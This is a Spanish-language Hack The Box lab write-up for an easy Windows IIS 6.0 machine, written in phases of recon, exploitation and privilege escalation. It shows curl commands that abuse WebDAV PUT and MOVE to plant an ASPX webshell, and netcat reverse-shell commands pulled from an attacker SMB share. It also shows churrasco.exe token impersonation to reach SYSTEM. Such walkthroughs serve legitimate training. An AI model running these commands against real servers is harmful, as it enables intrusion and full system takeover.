
--- 
- Tags: #windows #Easy #HTB #redes 
- --- 
#### QUÉ SE EXPLOTA? 

Abusing PUT & MOVE Methods - Uploading Aspx WebShell
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow [RCE]
Token Kidnapping - Churrasco [Privilege Escalation]

#### Write Up

##### PRIMERA FASE: Reconocimiento

**La primer fase de esta etapa como siempre empezamos haciendo los escaneos propios**. 

Primeramente determinamos el **SO** lanzando un paquete **ICMP** con **ping** para determinar ante que tipo de máquina estamos. 

![](../imgs/Pasted image 20251120132446.png)

El primer escaneo está enfocado en reconocer todos los puertos abiertos de un Dispositivo. **Para este escaneo utilizaremos un SYN scan** . 

Para la segunda parte del escaneo **utilizaremos los scripts que trae por defecto nmap**. El fin de esta segunda etapa es obtener más detalles de los puertos previamente descubiertos 

![](../imgs/Pasted image 20251120121612.png)

**Descubrimos el puerto 80 abierto** por lo que hay una página corriendo. **Además de eso, descubrimos diferentes [[Métodos HTTP]]** Y **[[WebDAV]]** disponible.

![](../imgs/Pasted image 20251120123750.png)

**No encontramos nada en la web** por lo que proseguimos a utilizar **[[davtest]]** para **identificar qué podemos hacer con webdav** 

![](../imgs/Pasted image 20251120124104.png)

De acuerdo a **[[WebDAV]]** podemos subir algunos archivos pero no **[[aspx]]** ni **[[php]]** además podemos ejecutar archivos **.txt** y **.html**. 

##### SEGUNDA FASE: Explotación

Proseguimos a subir con **PUT** un archivo txt a ver si lo podemos ejecutar. 

```bash
curl -X PUT http://10.10.10.15/cmd.txt -d @cmd.txt
```

![](../imgs/Pasted image 20251120132826.png)

![](../imgs/Pasted image 20251120132837.png)

**Ya que no tenemos permisos para subir archivos [[aspx]]** entonces subimos en **.txt** una **webshell** para posteriormente a través del **método MOVE** cambiar el nombre a un archivo [[aspx]]. 

```bash
locate .aspx
```



![](../imgs/Pasted image 20251120133136.png)

**Subimos el archivo con PUT**

```bash

curl -X PUT "http://10.10.10.15/cmd.txt" -d @cmd.txt

```

**Le cambiamos la extensión con el método MOVE** 

```bash

curl -X MOVE "http://10.10.10.15/cmd.txt" -H "Destination:http://10.10.10.15/cmd.aspx"
```

![](../imgs/Pasted image 20251120133858.png)

![](../imgs/Pasted image 20251120133947.png)

**Tenemos ejecución de comandos** 

**Ahora a través de [[SMB]]** vamos a compartirnos un binario de **[[NETCAT]]** para poder entablarnos una **[[Reverse shell]]** 

```bash
locate nc.exe
```

```bash

impacket-smbserver smbFolder $(pwd)-smb2support
```

nos ponemos en escucha con **rlwrap y [[NETCAT]]**

**DESDE LA WEBSHELL**:

```cmd
\\10.10.16.3\smbFolder\nc.exe -e cmd 10.10.16.3 443
```



![](../imgs/Pasted image 20251120135022.png)

**Ganamos conexión**

##### TERCERA FASE: Postexplotación - Privesc

**Empezamos con algunos [[Comandos utiles para escalar]]** en este caso en Windows

![](../imgs/Pasted image 20251120135622.png)

**Encontramos el [[SeImpersonatePrivilege]] encendido** por lo que podemos abusar de **[[JuicyPotato]] o [[churrasco.exe]]**. Generalmente cuando estamos **Ante una versión antigua como en este caso**:

![](../imgs/Pasted image 20251120140445.png)

**Utilizamos [[churrasco.exe]]** 

**Lo descargamos a través de [[SMB]]** y lo ponemos en el directorio **temp** 

```bash

impacket-smbserver smbFolder $(pwd) -smb2support
```


![](../imgs/Pasted image 20251120143543.png)

**Churrasco ejecuta comandos a nivel Authority system** por lo que si ejecutamos el **nc.exe** d enuestro recurso compartido y nos enviamos una shell **resiviremos la shell como AUhtority system**

```cmd
churrasco.exe "\\10.10.16.3\smbFolder\nc.exe -e cmd 10.10.16.3 4444"
```

Nos ponemos en escucha y lo ejecutamos.

![](../imgs/Pasted image 20251120143842.png)